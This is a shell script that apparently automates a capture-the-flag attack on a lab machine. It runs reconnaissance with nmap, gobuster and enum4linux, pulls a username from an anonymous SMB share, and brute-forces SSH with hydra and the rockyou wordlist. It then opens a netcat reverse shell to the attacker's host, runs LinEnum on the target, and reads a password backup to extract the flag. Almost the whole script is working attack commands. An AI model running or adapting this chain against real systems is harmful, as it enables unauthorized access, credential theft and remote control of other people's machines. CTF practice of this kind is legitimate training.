#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.227.66"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - RECONNAISSANCE"
nmap -p- -sC -sV -A -sS -T4 ${target_ip} > $result_folder/nmap-results.txt
gobuster dir -u http://$target_ip:80 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -o $result_folder/gobuster-results.txt --exclude-length 1168
enum4linux-ng $target_ip > $result_folder/enum4linux.txt
curl -s -X GET http://$target_ip/development/j.txt -o $result_folder/j.txt
curl -s -X GET http://$target_ip/development/dev.txt -o $result_folder/dev.txt

echo "2 - BRUTE FORCE ATTACK"
smbclient  //$target_ip/Anonymous -U mhdobmoi --quiet --no-pass --command "get ./staff.txt /work/results/staff.txt"
USERNAME=$(cat $result_folder/staff.txt | sed -n 's/.*This means you too, \(.*\)!)/\1/p')
USERNAME="${USERNAME,,}"
echo "Username is '$USERNAME'"
hydra -l $USERNAME -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ${target_ip} ssh > $result_folder/hydra-ssh.txt
PASSWORD=$(cat $result_folder/hydra-ssh.txt | sed -n 's/.*password: \(.*\)/\1/p')
echo "Password is '$PASSWORD'"

echo "3 - PRIVILEGE ESCALATION"
sshpass -p $PASSWORD ssh $USERNAME@$target_ip "nc $attack_ip 4444 -e /bin/bash"
sshpass -p $PASSWORD scp -o StrictHostKeyChecking=no $scriptpath/../../tools/LinEnum.sh $USERNAME@$target_ip:/tmp/LinEnum.sh
sshpass -p $PASSWORD ssh -o StrictHostKeyChecking=no $USERNAME@$target_ip "/tmp/LinEnum.sh" > $result_folder/linenum.txt
sshpass -p $PASSWORD ssh -o StrictHostKeyChecking=no $USERNAME@$target_ip "vim.basic /home/kay/pass.bak" > $result_folder/pass.bak &
PID=$!
sleep 5
FLAG=$(cat $result_folder/pass.bak | sed -n 's/.*1H\(.*\)/\1/p' | tr -d '\n' | tr -d '\r\n')
echo "Flag is '$FLAG'"
kill -9 $PID
